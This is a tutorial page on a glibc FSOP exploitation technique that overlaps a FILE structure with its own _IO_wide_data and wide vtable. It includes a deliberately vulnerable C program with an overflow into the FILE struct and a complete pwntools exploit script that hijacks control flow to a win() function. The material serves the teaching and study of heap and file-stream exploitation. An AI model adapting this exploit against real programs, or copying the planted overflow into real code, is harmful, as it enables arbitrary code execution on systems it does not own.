#metadata(
  (
    title: "Overlapping Structures",
    description: "Exploiting FSOP with limited space by overlapping the FILE structure with the wide data structure.",
    date: "2026-01-02",
    order: 7,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Overlapping Structures: FSOP with Limited Space

In standard FSOP hijacking, we typically use a controlled heap buffer to store a fake `_wide_data` structure and its associated vtable. However, if we lack a heap leak or space is extremely constrained, we can trick Glibc into using the `FILE` structure itself as the wide data struct.

This "self-referential" overlap allows us to satisfy all exploitation constraints using only the memory allocated for the `FILE` object.

== Vulnerable Scenario

The program provides a libc leak and the address of the `FILE` structure (`fp`). We have a direct overflow into `fp`, but no other controlled buffers are easily reachable.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

FILE *fp;
char *buf;

void win() { puts("Well done baby"); }

int main(int argc, char **argv, char **envp) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("libc leak (puts): %p\n", puts);

  buf = malloc(0x100);
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "r");

  printf("FILE struct address (fp): %p\n", fp);

  // Vulnerability: 0x1e0 bytes overflow into the FILE structure
  read(0, fp, 0x1e0);

  // Triggering the hijack
  fwrite(buf, 1, 0x100, fp);

  return 0;
}
```

== Exploit Strategy: The Self-Overlapping `FILE`

The core idea is to point `fp->_wide_data` back to `fp`. This creates an overlap where fields of the `FILE` structure are interpreted as members of the `_IO_wide_data` structure.

=== Overlap Analysis

1. *`_wide_data` Pointer*: We set `fp + 0xa0` (the `_wide_data` member) to point to `fp`.
2. *Wide Vtable Pointer*: Inside the `_IO_wide_data` struct (which Glibc now thinks starts at `fp`), the `_wide_vtable` member is at offset `0xe0`. We also point this back to `fp`.
3. *The Hijack Point*: When `_IO_wdoallocbuf` is called, it attempts to call `_wide_vtable + 0x68`. Since `_wide_vtable` points to `fp`, it calls the address stored at `fp + 0x68`.
4. *The Payload*: Conveniently, `fp + 0x68` is the `_chain` member of the original `FILE` structure. We place the address of `win()` here.

#table(
  columns: (auto, auto, 1fr),
  inset: 10pt,
  align: (center, left, left),
  [*Offset*], [*FILE Field*], [*Overlapped Purpose*],
  [`0x68`], [`_chain`], [Target Jump: `win()` (called via `_wide_vtable + 0x68`)],
  [`0x88`], [`_lock`], [Must point to writable memory (we use `fp` itself)],
  [`0xA0`], [`_wide_data`], [Points to `fp` (start of self-overlap)],
  [`0xD8`], [`vtable`], [Points to `_IO_wfile_jumps - 0x20` (triggers overflow)],
  [`0xE0`], [*(Padding)*], [`_wide_vtable`: Points back to `fp`],
)

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")
p = process(elf.path)
libc = elf.libc

# 1. Parse leaks
p.recvuntil(b"libc leak (puts): ")
libc.address = int(p.recvline().strip(), 16) - libc.sym.puts
info(f"Libc base: {hex(libc.address)}")

p.recvuntil(b"FILE struct address (fp): ")
fp_addr = int(p.recvline().strip(), 16)
info(f"FILE pointer (fp): {hex(fp_addr)}")

# 2. Construct the self-overlapping payload
# We repurpose the FILE struct members to act as the wide data struct
payload = flat(
    {
        0x68: elf.sym.win,                      # _chain -> will be wide_vtable + 0x68
        0x88: fp_addr,                          # _lock -> must be writable
        0xA0: fp_addr,                          # _wide_data -> points to self (fp)
        0xD8: libc.sym._IO_wfile_jumps - 0x20,  # vtable -> targets _IO_wfile_overflow
    },
    filler=b"\x00",
)

# 3. Setup _wide_vtable at offset 0xE0
# We pad to 0xE0 and then append the pointer back to fp_addr
payload = payload.ljust(0xE0, b"\x00")
payload += p64(fp_addr)                         # _wide_vtable -> points to self (fp)

p.sendline(payload)

p.interactive()
```
